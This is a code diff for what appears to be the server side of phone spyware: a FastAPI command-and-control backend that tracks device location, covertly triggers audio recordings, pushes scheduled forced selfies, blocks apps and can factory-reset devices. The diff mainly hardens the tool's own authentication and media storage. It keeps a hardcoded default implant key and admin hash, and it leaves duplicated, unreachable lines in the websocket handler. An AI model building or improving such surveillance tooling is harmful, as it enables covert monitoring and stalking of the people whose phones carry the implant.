@@ -6,46 +6,106 @@ import os
 import math
 import shutil
 import threading
-from typing import Optional
-from contextlib import asynccontextmanager
-from fastapi import FastAPI, Form, Request, Depends, HTTPException, status, UploadFile, File, Body
+from datetime import datetime, timedelta
+from typing import Optional, Generator
+from contextlib import asynccontextmanager, suppress
+from fastapi import FastAPI, Form, Request, Depends, HTTPException, status, UploadFile, File, Body, Header
 from fastapi.staticfiles import StaticFiles
 from fastapi.responses import JSONResponse, FileResponse, RedirectResponse, HTMLResponse
 from fastapi.middleware.cors import CORSMiddleware
 from fastapi import WebSocket, WebSocketDisconnect
 import json
+import asyncio
+
+SESSION_COOKIE_NAME = "session_token"
+SESSION_DURATION = 60 * 60 * 8  # 8 hours
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+DB_FILE = os.path.join(BASE_DIR, "telemetry.db")
+ADMIN_USERNAME = os.getenv("ADMIN_USERNAME", "admin")
+# Default fallback placeholder for deployment initialization
+ADMIN_PASSWORD_HASH = str(os.getenv("ADMIN_HASH") or "03ac674216f3e15c761ee1a5e255f067953623c8b388b4459e13f978d7c846f4")
+IMPLANT_KEY = os.getenv("IMPLANT_KEY", "DeltaForce2027")
+PROTECTED_MEDIA_ROOT = os.path.join(BASE_DIR, "protected_media")
+AUDIO_DIR = os.path.join(PROTECTED_MEDIA_ROOT, "audio")
+SELFIE_DIR = os.path.join(PROTECTED_MEDIA_ROOT, "selfies")
+
+session_store: dict[str, float] = {}
 
 class ConnectionManager:
     def __init__(self):
         self.active_connections: dict[str, WebSocket] = {}
+        self.lock = asyncio.Lock()
 
     async def connect(self, websocket: WebSocket, client_id: str):
         await websocket.accept()
-        self.active_connections[client_id] = websocket
+        async with self.lock:
+            self.active_connections[client_id] = websocket
 
-    def disconnect(self, client_id: str):
-        if client_id in self.active_connections:
-            del self.active_connections[client_id]
+    async def disconnect(self, client_id: str):
+        async with self.lock:
+            if client_id in self.active_connections:
+                del self.active_connections[client_id]
 
     async def send_task(self, client_id: str, task_dict: dict):
-        if client_id in self.active_connections:
+        async with self.lock:
+            websocket = self.active_connections.get(client_id)
+        if websocket is not None:
             try:
-                await self.active_connections[client_id].send_text(json.dumps(task_dict))
+                await websocket.send_text(json.dumps(task_dict))
             except Exception:
-                self.disconnect(client_id)
+                await self.disconnect(client_id)
 
 ws_manager = ConnectionManager()
+pending_location_checks: dict[str, asyncio.Future] = {}
+
+
+def safe_token() -> str:
+    return secrets.token_urlsafe(32)
+
+
+def hash_password(password: str) -> str:
+    return hashlib.sha256(password.encode('utf-8')).hexdigest()
+
+
+def add_session(token: str) -> None:
+    expires = time.time() + SESSION_DURATION
+    session_store[token] = expires
+
+
+def validate_session_token(token: str) -> bool:
+    if not token:
+        return False
+    expires = session_store.get(token)
+    if not expires or expires < time.time():
+        session_store.pop(token, None)
+        return False
+    session_store[token] = time.time() + SESSION_DURATION
+    return True
+
+
+def sanitize_device_id(device_id: str) -> str:
+    safe = "".join(c for c in device_id if c.isalnum() or c in ("-", "_")).strip()
+    return safe or "unknown"
+
+
+def create_db_connection() -> sqlite3.Connection:
+    conn = sqlite3.connect(DB_FILE, check_same_thread=False, timeout=30)
+    conn.row_factory = sqlite3.Row
+    conn.execute("PRAGMA journal_mode=WAL;")
+    conn.execute("PRAGMA synchronous=NORMAL;")
+    conn.execute("PRAGMA temp_store=MEMORY;")
+    return conn
+
+
+def get_db() -> Generator[sqlite3.Connection, None, None]:
+    conn = create_db_connection()
+    try:
+        yield conn
+    finally:
+        conn.close()
 
 
 
-
-
-DB_FILE = "telemetry.db"
-ADMIN_USERNAME = os.getenv("ADMIN_USERNAME", "admin")
-# Default fallback placeholder for deployment initialization
-ADMIN_PASSWORD_HASH = str(os.getenv("ADMIN_HASH") or "03ac674216f3e15c761ee1a5e255f067953623c8b388b4459e13f978d7c846f4")
-
-IMPLANT_KEY = os.getenv("IMPLANT_KEY", "DeltaForce2027")
 
 def haversine(lat1: float, lon1: float, lat2: float, lon2: float) -> float:
     R = 6371000.0  # Radius of Earth in meters
@@ -57,9 +117,11 @@ def haversine(lat1: float, lon1: float, lat2: float, lon2: float) -> float:
 
 def init_db():
     """Initializes the database schema on system startup."""
-    conn = sqlite3.connect(DB_FILE)
+    conn = create_db_connection()
     c = conn.cursor()
     c.execute("PRAGMA journal_mode=WAL;")
+    c.execute("PRAGMA synchronous=NORMAL;")
+    c.execute("PRAGMA temp_store=MEMORY;")
     c.execute("""
         CREATE TABLE IF NOT EXISTS devices (
             device_id TEXT PRIMARY KEY,
@@ -130,7 +192,30 @@ def init_db():
             unix_time REAL,
             battery INTEGER DEFAULT 0,
             lat REAL DEFAULT 0,
-            lon REAL DEFAULT 0
+            lon REAL DEFAULT 0,
+            review_status TEXT DEFAULT 'pending',
+            reviewed_at TEXT DEFAULT NULL
+        )
+    """)
+    c.execute("""
+        CREATE TABLE IF NOT EXISTS selfie_skips (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            device_id TEXT,
+            skip_date TEXT,
+            timestamp TEXT,
+            unix_time REAL,
+            UNIQUE(device_id, skip_date)
+        )
+    """)
+    c.execute("""
+        CREATE TABLE IF NOT EXISTS selfie_schedule (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            device_id TEXT UNIQUE,
+            next_run_at TEXT,
+            enabled INTEGER DEFAULT 1,
+            dev_mode INTEGER DEFAULT 1,
+            created_at REAL,
+            updated_at REAL
         )
     """)
 
@@ -163,25 +248,33 @@ def init_db():
         c.execute("ALTER TABLE devices ADD COLUMN hidden INTEGER DEFAULT 0")
     except sqlite3.OperationalError:
         pass
+
+    try:
+        c.execute("ALTER TABLE selfies ADD COLUMN review_status TEXT DEFAULT 'pending'")
+    except sqlite3.OperationalError:
+        pass
+
+    try:
+        c.execute("ALTER TABLE selfies ADD COLUMN reviewed_at TEXT DEFAULT NULL")
+    except sqlite3.OperationalError:
+        pass
     
     c.execute("CREATE INDEX IF NOT EXISTS idx_history_device_id ON history(device_id)")
     c.execute("CREATE INDEX IF NOT EXISTS idx_history_unix_time ON history(unix_time)")
+    c.execute("CREATE INDEX IF NOT EXISTS idx_history_device_unix ON history(device_id, unix_time)")
     c.execute("CREATE INDEX IF NOT EXISTS idx_daily_screen_time_device_date ON daily_screen_time(device_id, date)")
     c.execute("CREATE INDEX IF NOT EXISTS idx_battery_history_device_id ON battery_history(device_id)")
+    c.execute("CREATE INDEX IF NOT EXISTS idx_battery_history_device_unix ON battery_history(device_id, unix_time)")
     c.execute("CREATE INDEX IF NOT EXISTS idx_device_errors_device_id ON device_errors(device_id)")
+    c.execute("CREATE INDEX IF NOT EXISTS idx_device_errors_device_unix ON device_errors(device_id, unix_time)")
     c.execute("CREATE INDEX IF NOT EXISTS idx_selfies_device_id ON selfies(device_id)")
-    
+    c.execute("CREATE INDEX IF NOT EXISTS idx_selfies_device_unix ON selfies(device_id, unix_time)")
+    c.execute("CREATE INDEX IF NOT EXISTS idx_selfie_schedule_device_id ON selfie_schedule(device_id)")
     conn.commit()
     conn.close()
 
-# Global connection pool
-global_db_conn = sqlite3.connect(DB_FILE, check_same_thread=False)
-global_db_conn.row_factory = sqlite3.Row
-global_db_conn.execute("PRAGMA journal_mode=WAL;")
-
-def get_db():
-    """Returns the persistent thread-safe DB connection instead of creating a new one per request."""
-    return global_db_conn
+# Ensure the database schema exists even if FastAPI startup lifespan isn't executed.
+init_db()
 
 LAST_CLEANUP = 0
 CLEANUP_INTERVAL = 86400  # Run cleanup at most once per day
@@ -200,28 +293,160 @@ def run_auto_cleanup(db: sqlite3.Connection):
         c.execute("DELETE FROM battery_history WHERE unix_time < ?", (seven_days_ago,))
         c.execute("DELETE FROM device_errors WHERE unix_time < ?", (seven_days_ago,))
         db.commit()
+        db.execute("PRAGMA wal_checkpoint(TRUNCATE);")
+        try:
+            db.execute("PRAGMA incremental_vacuum(100);")
+        except sqlite3.DatabaseError:
+            pass
         
         # 2. Delete unflagged audio older than 7 days
-        if os.path.exists("static/audio"):
-            for f in os.listdir("static/audio"):
+        if os.path.exists(AUDIO_DIR):
+            for f in os.listdir(AUDIO_DIR):
                 if f.endswith(".wav") and "_FLAG" not in f:
                     try:
-                        # Extract timestamp: fake_android_99_1779379052.wav
                         parts = f.split('_')
                         ts = int(parts[-1].split('.')[0])
                         if ts < seven_days_ago:
-                            os.remove(os.path.join("static/audio", f))
+                            os.remove(os.path.join(AUDIO_DIR, f))
                     except Exception:
                         pass
+
+scheduler_task: Optional[asyncio.Task] = None
+
+
+def choose_default_selfie_datetime() -> datetime:
+    now = datetime.now()
+    if now.hour < 10:
+        return now.replace(hour=10, minute=30, second=0, microsecond=0)
+    if now.hour < 14:
+        return now.replace(hour=14, minute=30, second=0, microsecond=0)
+    if now.hour < 18:
+        return now.replace(hour=18, minute=30, second=0, microsecond=0)
+    return (now + timedelta(days=1)).replace(hour=10, minute=30, second=0, microsecond=0)
+
+
+def parse_datetime_string(value: str) -> Optional[datetime]:
+    if not value:
+        return None
+    try:
+        return datetime.strptime(value, "%Y-%m-%d %H:%M")
+    except Exception:
+        return None
+
+
+def format_datetime_string(value: datetime) -> str:
+    return value.strftime("%Y-%m-%d %H:%M")
+
+
+def get_next_run_at_for_time_string(time_str: str) -> str:
+    now = datetime.now()
+    try:
+        parsed = datetime.strptime(time_str, "%H:%M")
+        next_run = now.replace(hour=parsed.hour, minute=parsed.minute, second=0, microsecond=0)
+    except Exception:
+        next_run = choose_default_selfie_datetime()
+    if next_run <= now:
+        next_run += timedelta(days=1)
+    return format_datetime_string(next_run)
+
+
+def to_int(value, default=0) -> int:
+    try:
+        return int(value)
+    except Exception:
+        if isinstance(value, str):
+            return 1 if value.lower() in ("true", "yes", "on") else 0
+        return default
+
+
+def ensure_selfie_schedule(device_id: str, db: sqlite3.Connection):
+    c = db.cursor()
+    c.execute("SELECT device_id, next_run_at, enabled, dev_mode FROM selfie_schedule WHERE device_id = ?", (device_id,))
+    row = c.fetchone()
+    if row:
+        return row
+    next_run = choose_default_selfie_datetime()
+    now_unix = time.time()
+    c.execute("INSERT INTO selfie_schedule (device_id, next_run_at, enabled, dev_mode, created_at, updated_at) VALUES (?, ?, 1, 1, ?, ?)",
+              (device_id, format_datetime_string(next_run), now_unix, now_unix))
+    db.commit()
+    c.execute("SELECT device_id, next_run_at, enabled, dev_mode FROM selfie_schedule WHERE device_id = ?", (device_id,))
+    return c.fetchone()
+
+
+def update_selfie_schedule_next_day(device_id: str, db: sqlite3.Connection):
+    c = db.cursor()
+    c.execute("SELECT next_run_at FROM selfie_schedule WHERE device_id = ?", (device_id,))
+    row = c.fetchone()
+    if not row or not row["next_run_at"]:
+        return
+    current_run = parse_datetime_string(row["next_run_at"])
+    if not current_run:
+        return
+    next_run = current_run + timedelta(days=1)
+    c.execute("UPDATE selfie_schedule SET next_run_at = ?, updated_at = ? WHERE device_id = ?",
+              (format_datetime_string(next_run), time.time(), device_id))
+    db.commit()
+
+
+def is_skip_today(device_id: str, today: str, c: sqlite3.Connection.cursor) -> bool:
+    c.execute("SELECT 1 FROM selfie_skips WHERE device_id = ? AND skip_date = ? LIMIT 1", (device_id, today))
+    return c.fetchone() is not None
+
+
+async def selfie_scheduler():
+    while True:
+        try:
+            db = create_db_connection()
+            c = db.cursor()
+            c.execute("SELECT device_id, next_run_at, enabled, dev_mode FROM selfie_schedule")
+            rows = c.fetchall()
+            now = datetime.now()
+            today = now.strftime("%Y-%m-%d")
+            for row in rows:
+                if row["enabled"] != 1 or not row["next_run_at"]:
+                    continue
+                next_run = parse_datetime_string(row["next_run_at"])
+                if not next_run or next_run > now:
+                    continue
+                if is_skip_today(row["device_id"], today, c):
+                    update_selfie_schedule_next_day(row["device_id"], db)
+                    continue
+                if row["dev_mode"] == 1:
+                    update_selfie_schedule_next_day(row["device_id"], db)
+                    continue
+                if row["device_id"] in ws_manager.active_connections:
+                    await ws_manager.send_task(row["device_id"], {"task": "force_selfie"})
+                    update_selfie_schedule_next_day(row["device_id"], db)
+        except asyncio.CancelledError:
+            break
+        except Exception as e:
+            print(f"[scheduler] selfie scheduler error: {e}", flush=True)
+        finally:
+            try:
+                db.close()
+            except Exception:
+                pass
+        await asyncio.sleep(30)
+
 
 @asynccontextmanager
 async def lifespan(app: FastAPI):
     # Setup infrastructure folders and verify DB structure on start
-    os.makedirs("static/audio", exist_ok=True)
-    os.makedirs("static/selfies", exist_ok=True)
+    os.makedirs("static", exist_ok=True)
+    os.makedirs(AUDIO_DIR, exist_ok=True)
+    os.makedirs(SELFIE_DIR, exist_ok=True)
     os.makedirs("templates", exist_ok=True)
     init_db()
-    yield
+    global scheduler_task
+    scheduler_task = asyncio.create_task(selfie_scheduler())
+    try:
+        yield
+    finally:
+        if scheduler_task:
+            scheduler_task.cancel()
+            with suppress(asyncio.CancelledError):
+                await scheduler_task
 
 app = FastAPI(lifespan=lifespan)
 
@@ -229,6 +454,7 @@ app = FastAPI(lifespan=lifespan)
 async def websocket_endpoint(websocket: WebSocket):
     await websocket.accept()
     client_id = f"client_{id(websocket)}"
+    db = create_db_connection()
     try:
         while True:
             raw_data = await websocket.receive_text()
@@ -245,7 +471,6 @@ async def websocket_endpoint(websocket: WebSocket):
                     
                     now_unix = time.time()
                     time_str = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
-                    db = get_db()
                     c = db.cursor()
                     
                     c.execute("SELECT level, lat, lon, installed_apps, location_tracking, screen_time_minutes, charging, ping_interval, hidden FROM devices WHERE device_id=?", (client_id,))
@@ -299,9 +524,14 @@ async def websocket_endpoint(websocket: WebSocket):
                         charging_val = int(charging_val)
                     current_screen_time = screen_time_minutes if screen_time_minutes is not None else (existing["screen_time_minutes"] if existing else 0)
 
+                    if "loc_state" in data:
+                        pending_future = pending_location_checks.get(client_id)
+                        if pending_future is not None and not pending_future.done():
+                            pending_future.set_result(int(loc_state_val))
+
                     # Record battery history only when the battery level changes
                     if not existing or battery_val != existing["level"]:
-                        c.execute("SELECT unix_time FROM battery_history WHERE device_id = ? ORDER BY id DESC LIMIT 1", (client_id,))
+                        c.execute("SELECT unix_time FROM battery_history WHERE device_id = ? ORDER BY unix_time DESC LIMIT 1", (client_id,))
                         last_batt_row = c.fetchone()
                         gap_seconds = 0
                         if last_batt_row:
@@ -336,22 +566,28 @@ async def websocket_endpoint(websocket: WebSocket):
                         c.execute('''INSERT INTO history (device_id, level, lat, lon, timestamp, unix_time)
                                      VALUES (?, ?, ?, ?, ?, ?)''',
                                   (client_id, battery_val, lat_val, lon_val, time_str, now_unix))
-                    
+
                     db.commit()
+                    if is_new_connection:
+                        ensure_selfie_schedule(client_id, db)
             except WebSocketDisconnect:
-                ws_manager.disconnect(client_id)
+                await ws_manager.disconnect(client_id)
+                break
+                await ws_manager.disconnect(client_id)
                 break
             except Exception as e:
                 import traceback
                 print("Exception in websocket loop:", e)
                 traceback.print_exc()
-                ws_manager.disconnect(client_id)
+                await ws_manager.disconnect(client_id)
                 break
     except Exception as e:
         import traceback
         print("Outer exception in websocket endpoint:", e)
         traceback.print_exc()
-        ws_manager.disconnect(client_id)
+        await ws_manager.disconnect(client_id)
+    finally:
+        db.close()
 
 
 app.add_middleware(
@@ -362,22 +598,49 @@ app.add_middleware(
     allow_headers=["*"],
 )
 
-# Mount static media storage
+# Mount public static assets.
 app.mount("/static", StaticFiles(directory="static"), name="static")
 
+@app.get("/media/audio/{filename}")
+async def protected_audio(filename: str, request: Request):
+    verify_session(request)
+    safe_name = os.path.basename(filename)
+    file_path = os.path.join(AUDIO_DIR, safe_name)
+    if not os.path.exists(file_path):
+        raise HTTPException(status_code=404, detail="File not found")
+    return FileResponse(file_path, media_type="audio/wav")
+
+@app.get("/media/selfies/{filename}")
+async def protected_selfie(filename: str, request: Request):
+    verify_session(request)
+    safe_name = os.path.basename(filename)
+    file_path = os.path.join(SELFIE_DIR, safe_name)
+    if not os.path.exists(file_path):
+        raise HTTPException(status_code=404, detail="File not found")
+    return FileResponse(file_path, media_type="image/jpeg")
+
+
 def verify_session(request: Request) -> bool:
-    """Verifies access authorization cookied headers."""
-    token = request.cookies.get("session_token")
-    if not token or not secrets.compare_digest(token, ADMIN_PASSWORD_HASH):
+    """Verifies access authorization based on secure session tokens."""
+    token = request.cookies.get(SESSION_COOKIE_NAME)
+    if not token or not validate_session_token(token):
         raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="Unauthorized")
     return True
 
 @app.post("/api/login")
-async def api_login(username: str = Form(...), password: str = Form(...)):
-    hashed_input = hashlib.sha256(password.encode()).hexdigest()
+async def api_login(request: Request, username: str = Form(...), password: str = Form(...)):
+    hashed_input = hash_password(password)
     if username == ADMIN_USERNAME and secrets.compare_digest(hashed_input, ADMIN_PASSWORD_HASH):
+        session_token = safe_token()
+        add_session(session_token)
         response = RedirectResponse(url="/", status_code=status.HTTP_303_SEE_OTHER)
-        response.set_cookie(key="session_token", value=ADMIN_PASSWORD_HASH, httponly=True, samesite="strict")
+        response.set_cookie(
+            key=SESSION_COOKIE_NAME,
+            value=session_token,
+            httponly=True,
+            samesite="strict",
+            secure=request.url.scheme == "https",
+        )
         return response
     return HTMLResponse("<p style='color:red; text-align:center; margin-top:50px;'>Authentication failure. Invalid Key Ring.</p>", status_code=401)
 
@@ -509,7 +772,8 @@ async def get_devices(request: Request, db: sqlite3.Connection = Depends(get_db)
     return {"devices": [r["device_id"] for r in rows]}
 
 @app.get("/check_commands")
-async def check_commands(device_id: str, db: sqlite3.Connection = Depends(get_db)):
+async def check_commands(device_id: str, request: Request, db: sqlite3.Connection = Depends(get_db)):
+    verify_session(request)
     c = db.cursor()
     c.execute("SELECT ping_interval, record_audio, notif_state, notif_text, play_audio FROM devices WHERE device_id = ?", (device_id,))
     row = c.fetchone()
@@ -521,7 +785,7 @@ async def check_commands(device_id: str, db: sqlite3.Connection = Depends(get_db
 async def get_errors(device_id: str, request: Request, db: sqlite3.Connection = Depends(get_db)):
     verify_session(request)
     c = db.cursor()
-    c.execute("SELECT source, message, timestamp FROM device_errors WHERE device_id = ? ORDER BY id DESC LIMIT 50", (device_id,))
+    c.execute("SELECT source, message, timestamp FROM device_errors WHERE device_id = ? ORDER BY unix_time DESC LIMIT 50", (device_id,))
     rows = c.fetchall()
     return {"errors": [{"source": r["source"], "message": r["message"], "timestamp": r["timestamp"]} for r in rows]}
 
@@ -538,7 +802,7 @@ async def get_stats(device_id: str, request: Request, db: sqlite3.Connection = D
     speed_kmh = 0.0
     
     if row:
-        c.execute("SELECT lat, lon, unix_time FROM history WHERE device_id = ? ORDER BY id DESC LIMIT 2", (device_id,))
+        c.execute("SELECT lat, lon, unix_time FROM history WHERE device_id = ? ORDER BY unix_time DESC LIMIT 2", (device_id,))
         points = c.fetchall()
         if len(points) == 2:
             dist = haversine(points[1]["lat"], points[1]["lon"], points[0]["lat"], points[0]["lon"])
@@ -555,7 +819,7 @@ async def get_stats(device_id: str, request: Request, db: sqlite3.Connection = D
         elif row['unix_time'] and (time.time() - row['unix_time'] < 180):
             is_online = True
         else:
-            c.execute("SELECT unix_time FROM history WHERE device_id = ? ORDER BY id DESC LIMIT 1", (device_id,))
+            c.execute("SELECT unix_time FROM history WHERE device_id = ? ORDER BY unix_time DESC LIMIT 1", (device_id,))
             lt_row = c.fetchone()
             if lt_row and lt_row['unix_time'] and (time.time() - lt_row['unix_time'] < 180):
                 is_online = True
@@ -576,9 +840,9 @@ async def get_history(device_id: str, request: Request, hours: float = 0, db: sq
     c = db.cursor()
     if hours > 0:
         threshold = time.time() - (hours * 3600)
-        c.execute("SELECT lat, lon FROM history WHERE device_id = ? AND unix_time >= ? ORDER BY id DESC LIMIT 1000", (device_id, threshold))
+        c.execute("SELECT lat, lon FROM history WHERE device_id = ? AND unix_time >= ? ORDER BY unix_time DESC LIMIT 1000", (device_id, threshold))
     else:
-        c.execute("SELECT lat, lon FROM history WHERE device_id = ? ORDER BY id DESC LIMIT 500", (device_id,))
+        c.execute("SELECT lat, lon FROM history WHERE device_id = ? ORDER BY unix_time DESC LIMIT 500", (device_id,))
     rows = c.fetchall()
     return {"path": [[r["lat"], r["lon"]] for r in rows]}
 
@@ -600,11 +864,11 @@ async def get_history_detailed(
             SELECT lat, lon, level, timestamp, unix_time 
             FROM history 
             WHERE device_id = ? AND unix_time >= ? AND unix_time <= ? 
-            ORDER BY id DESC
+            ORDER BY unix_time DESC
             LIMIT ? OFFSET ?
         """, (device_id, start_time, end_time, per_page, offset))
     else:
-        c.execute("SELECT lat, lon, level, timestamp, unix_time FROM history WHERE device_id = ? ORDER BY id DESC LIMIT ? OFFSET ?", (device_id, per_page, offset))
+        c.execute("SELECT lat, lon, level, timestamp, unix_time FROM history WHERE device_id = ? ORDER BY unix_time DESC LIMIT ? OFFSET ?", (device_id, per_page, offset))
         
     rows = c.fetchall()
     
@@ -637,11 +901,11 @@ async def battery_history(
     c = db.cursor()
     offset = (page - 1) * per_page
     if start_time and end_time:
-        c.execute("SELECT level, timestamp, unix_time, gap_seconds FROM battery_history WHERE device_id = ? AND unix_time >= ? AND unix_time <= ? ORDER BY id DESC LIMIT ? OFFSET ?", (device_id, start_time, end_time, per_page, offset))
+        c.execute("SELECT level, timestamp, unix_time, gap_seconds FROM battery_history WHERE device_id = ? AND unix_time >= ? AND unix_time <= ? ORDER BY unix_time DESC LIMIT ? OFFSET ?", (device_id, start_time, end_time, per_page, offset))
         rows = c.fetchall()
         c.execute("SELECT COUNT(*) FROM battery_history WHERE device_id = ? AND unix_time >= ? AND unix_time <= ?", (device_id, start_time, end_time))
     else:
-        c.execute("SELECT level, timestamp, unix_time, gap_seconds FROM battery_history WHERE device_id = ? ORDER BY id DESC LIMIT ? OFFSET ?", (device_id, per_page, offset))
+        c.execute("SELECT level, timestamp, unix_time, gap_seconds FROM battery_history WHERE device_id = ? ORDER BY unix_time DESC LIMIT ? OFFSET ?", (device_id, per_page, offset))
         rows = c.fetchall()
         c.execute("SELECT COUNT(*) FROM battery_history WHERE device_id = ?", (device_id,))
     total = c.fetchone()[0]
@@ -739,9 +1003,21 @@ async def set_factory_reset(device_id: str = Form(...), request: Request = Depen
 async def check_location_state(request: Request, device_id: str = Form(...)):
     if not verify_session(request):
         return HTMLResponse(status_code=401)
-    if device_id in ws_manager.active_connections:
+
+    connected = device_id in ws_manager.active_connections
+    if not connected:
+        return JSONResponse({"status": "sent", "connected": False, "loc_state": None})
+
+    future = asyncio.get_event_loop().create_future()
+    pending_location_checks[device_id] = future
+    try:
         await ws_manager.send_task(device_id, {"task": "check_location_state"})
-    return JSONResponse({"status": "sent"})
+        loc_state = await asyncio.wait_for(future, timeout=4.0)
+        return JSONResponse({"status": "ok", "connected": True, "loc_state": int(loc_state)})
+    except asyncio.TimeoutError:
+        return JSONResponse({"status": "timeout", "connected": True, "loc_state": None})
+    finally:
+        pending_location_checks.pop(device_id, None)
 
 @app.post("/request_installed_apps")
 async def request_installed_apps(request: Request, device_id: str = Form(...)):
@@ -752,16 +1028,11 @@ async def request_installed_apps(request: Request, device_id: str = Form(...)):
     return JSONResponse({"status": "sent"})
 
 @app.post("/set_location_tracking")
-async def set_location_tracking(request: Request, device_id: str = Form(...), enable: int = Form(...)):
-    if not verify_session(request):
-        return HTMLResponse(status_code=401)
-    conn = sqlite3.connect(DB_FILE)
-    c = conn.cursor()
+async def set_location_tracking(request: Request, device_id: str = Form(...), enable: int = Form(...), db: sqlite3.Connection = Depends(get_db)):
+    verify_session(request)
+    c = db.cursor()
     c.execute("UPDATE devices SET location_tracking=? WHERE device_id=?", (enable, device_id))
-    conn.commit()
-    conn.close()
-    
-    # Notify WS if active
+    db.commit()
     if device_id in ws_manager.active_connections:
         await ws_manager.send_task(device_id, {"task": "set_location", "track": enable})
     return JSONResponse({"status": "success"})
@@ -774,23 +1045,17 @@ async def logout():
 
 
 @app.post("/set_blocked_apps")
-async def set_blocked_apps(request: Request, payload: dict = Body(...)):
-    if not verify_session(request):
-        return HTMLResponse(status_code=401)
+async def set_blocked_apps(request: Request, payload: dict = Body(...), db: sqlite3.Connection = Depends(get_db)):
+    verify_session(request)
     device_id = payload.get('device_id')
     apps = payload.get('apps', '')
     if not device_id:
         return JSONResponse({"status": "error", "detail": "device_id is required"}, status_code=422)
-    conn = sqlite3.connect(DB_FILE)
-    c = conn.cursor()
+    c = db.cursor()
     c.execute("UPDATE devices SET blocked_apps=? WHERE device_id=?", (apps, device_id))
-    conn.commit()
-    conn.close()
-    
-    # Push to WS if connected
+    db.commit()
     if device_id in ws_manager.active_connections:
         await ws_manager.send_task(device_id, {"task": "update_blocked_apps", "apps": apps})
-            
     return JSONResponse({"status": "success"})
 
 @app.post("/delete_device")
@@ -802,13 +1067,32 @@ async def delete_device(device_id: str = Form(...), request: Request = Depends(v
     c.execute("DELETE FROM daily_screen_time WHERE device_id = ?", (device_id,))
     db.commit()
     
+    c.execute("DELETE FROM devices WHERE device_id = ?", (device_id,))
+    c.execute("DELETE FROM selfies WHERE device_id = ?", (device_id,))
+    db.commit()
+
+    safe_id = sanitize_device_id(device_id)
+    if os.path.exists(AUDIO_DIR):
+        for f in os.listdir(AUDIO_DIR):
+            if f.startswith(f"{safe_id}_"):
+                try:
+                    os.remove(os.path.join(AUDIO_DIR, f))
+                except OSError:
+                    pass
+    if os.path.exists(SELFIE_DIR):
+        for f in os.listdir(SELFIE_DIR):
+            if f.startswith(f"{safe_id}_"):
+                try:
+                    os.remove(os.path.join(SELFIE_DIR, f))
+                except OSError:
+                    pass
+
     if device_id in ws_manager.active_connections:
         try:
-            # Drop connection to force the implant to resync full state
             await ws_manager.active_connections[device_id].close()
         except Exception:
             pass
-        ws_manager.disconnect(device_id)
+        await ws_manager.disconnect(device_id)
         
     return {"status": "success"}
 
@@ -833,21 +1117,17 @@ async def upload_audio(
 ):
     if not secrets.compare_digest(implant_key, IMPLANT_KEY):
         return JSONResponse({"status": "error", "message": "Unauthorized Payload"}, status_code=403)
-        
-    # HARDENED: Prevent relative path traversal exploits (e.g. device_id = "../../../etc")
-    safe_device_id = "".join(c for c in device_id if c.isalnum() or c in ("-", "_")).strip()
-    if not safe_device_id:
-        safe_device_id = "unknown"
-        
+
+    safe_device_id = sanitize_device_id(device_id)
     c = db.cursor()
 
     if error == "busy":
-        filename = f"static/audio/{safe_device_id}_{int(time.time())}_BUSY.txt"
+        filename = os.path.join(AUDIO_DIR, f"{safe_device_id}_{int(time.time())}_BUSY.txt")
         with open(filename, "w") as f:
             f.write("Microphone was busy by another app - 0.0s recorded")
         c.execute("UPDATE devices SET record_audio = 0 WHERE device_id = ?", (device_id,))
     elif file:
-        filename = f"static/audio/{safe_device_id}_{int(time.time())}.wav"
+        filename = os.path.join(AUDIO_DIR, f"{safe_device_id}_{int(time.time())}.wav")
         with open(filename, "wb") as buffer:
             shutil.copyfileobj(file.file, buffer)
         c.execute("UPDATE devices SET record_audio = 0 WHERE device_id = ?", (device_id,))
@@ -858,18 +1138,19 @@ async def upload_audio(
 @app.get("/audio_files")
 async def get_audio_files(device_id: str, request: Request, db: sqlite3.Connection = Depends(get_db)):
     verify_session(request)
+    safe_id = sanitize_device_id(device_id)
     files = []
-    if os.path.exists("static/audio"):
-        for f in os.listdir("static/audio"):
-            if f.startswith(device_id) and (f.endswith(".wav") or f.endswith("BUSY.txt")):
-                files.append(f"/static/audio/{f}")
+    if os.path.exists(AUDIO_DIR):
+        for f in os.listdir(AUDIO_DIR):
+            if f.startswith(f"{safe_id}_") and (f.endswith(".wav") or f.endswith("BUSY.txt")):
+                files.append(f"/media/audio/{f}")
     files.sort(reverse=True)
     return {"files": files}
 
 @app.post("/delete_audio")
 async def delete_audio(filename: str = Form(...), request: Request = Depends(verify_session)):
     safe_name = os.path.basename(filename)
-    path = os.path.join("static/audio", safe_name)
+    path = os.path.join(AUDIO_DIR, safe_name)
     if os.path.exists(path):
         os.remove(path)
     return {"status": "success"}
@@ -877,8 +1158,8 @@ async def delete_audio(filename: str = Form(...), request: Request = Depends(ver
 @app.post("/flag_audio")
 async def flag_audio(filename: str = Form(...), request: Request = Depends(verify_session)):
     safe_name = os.path.basename(filename)
-    path = os.path.join("static/audio", safe_name)
-    if os.path.exists(path):
+    path = os.path.join(AUDIO_DIR, safe_name)
+    if os.path.exists(path) and safe_name.endswith('.wav'):
         if "_FLAG" not in safe_name:
             new_path = path.replace(".wav", "_FLAG.wav")
             os.rename(path, new_path)
@@ -891,22 +1172,24 @@ async def flag_audio(filename: str = Form(...), request: Request = Depends(verif
 async def upload_selfie(
     request: Request,
     selfie: UploadFile = File(...),
+    implant_key: Optional[str] = Header(None, alias="X-Implant-Key"),
     db: sqlite3.Connection = Depends(get_db)
 ):
     device_id = request.headers.get("X-Device-ID", "unknown")
-    safe_device_id = "".join(c for c in device_id if c.isalnum() or c in ("-", "_")).strip() or "unknown"
+    if not implant_key or not secrets.compare_digest(implant_key, IMPLANT_KEY):
+        raise HTTPException(status_code=403, detail="Unauthorized Payload")
+    safe_device_id = sanitize_device_id(device_id)
     
     now_unix = time.time()
     time_str = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(now_unix))
     date_str = time.strftime('%Y%m%d_%H%M%S', time.localtime(now_unix))
     
     filename = f"{safe_device_id}_{date_str}.jpg"
-    filepath = os.path.join("static/selfies", filename)
+    filepath = os.path.join(SELFIE_DIR, filename)
     
     with open(filepath, "wb") as buffer:
         shutil.copyfileobj(selfie.file, buffer)
     
-    # Get device's current battery & location for metadata
     c = db.cursor()
     c.execute("SELECT level, lat, lon FROM devices WHERE device_id = ?", (device_id,))
     row = c.fetchone()
@@ -914,9 +1197,9 @@ async def upload_selfie(
     lat = row["lat"] if row else 0.0
     lon = row["lon"] if row else 0.0
     
